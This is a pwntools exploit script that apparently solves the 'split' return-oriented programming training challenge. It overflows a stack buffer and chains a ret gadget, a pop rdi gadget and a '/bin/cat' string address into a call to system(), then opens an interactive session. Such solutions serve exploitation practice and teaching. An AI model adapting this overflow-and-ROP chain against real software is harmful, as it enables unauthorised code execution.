#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('split')

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

ret     = 0x00000000004006e7
bin_cat = 0x601060
pop_rdi = 0x00000000004007c3

pay = b'A' * 40
pay += p64(ret)
pay += p64(pop_rdi)
pay += p64(bin_cat)
pay += p64(exe.sym.system)

io = start()
io.clean()
io.sendline(pay)
io.interactive()

